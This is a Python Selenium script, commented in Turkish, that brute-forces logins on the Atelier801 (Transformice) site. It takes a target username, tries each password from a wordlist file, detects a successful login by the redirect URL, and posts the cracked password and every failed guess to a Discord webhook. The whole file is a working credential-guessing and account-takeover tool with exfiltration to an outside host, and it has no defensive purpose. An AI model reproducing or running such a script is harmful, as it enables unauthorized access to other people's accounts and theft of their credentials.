from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from discord_webhook import DiscordWebhook
from selenium.webdriver.common.by import By
import time
from time import gmtime, strftime
import datetime


name = input("Transformice Adı: ")


driver= webdriver.Chrome()
driver.get("https://atelier801.com/login?redirect=https%3A%2F%2Fatelier801.com%2Findex") # Ateiler801 giriş sayfasına yönlendirir.
time.sleep(3)

correctUrl = "https://atelier801.com/index"
username = driver.find_element(By.ID, 'auth_login_1')
password = driver.find_element(By.ID, 'auth_pass_1')
giris = driver.find_element(By.XPATH, "/html/body/div[2]/div[5]/div[3]/div/form[1]/fieldset/div[4]/button")


dosya = open("sifre.txt", "r") # Şifrelerin kaydedildiği wordlist dosyamızı açtık.

for satir in dosya:
    username.send_keys(name) # Transformice kullanıcı adı knk.
    time.sleep(1)
    password.send_keys(satir) # WordList'teki şifreler. Tek tek denenecek.
    time.sleep(1)
    giris.click() # Giriş yap butonuna tıklama komutu knk.
    time.sleep(1)
    time.sleep(15) # Şifreler denendikten sonra 3 saniye bekle.
    if driver.current_url == correctUrl:
        time.sleep(16)
        webhook = DiscordWebhook(url='WEBHOOK BURAYA', content= "[" + name + "]" + " CORRECT: {}".format(satir))
        response = webhook.execute()
    kapat = driver.find_element(By.XPATH, "/html/body/div[1]/form/div[3]/button")
    time.sleep(5)
    kapat.click()
    time.sleep(5)
    webhook = DiscordWebhook(url='WEBHOOOK BURAYA', content= "[BASIL]" + " HATALI ŞİFRE: {}".format(satir))
    response = webhook.execute()
    username.clear() # Username değişkenini sıfırla.
    password.clear() # Password değişkenini sıfırla.


    


time.sleep(1000) 
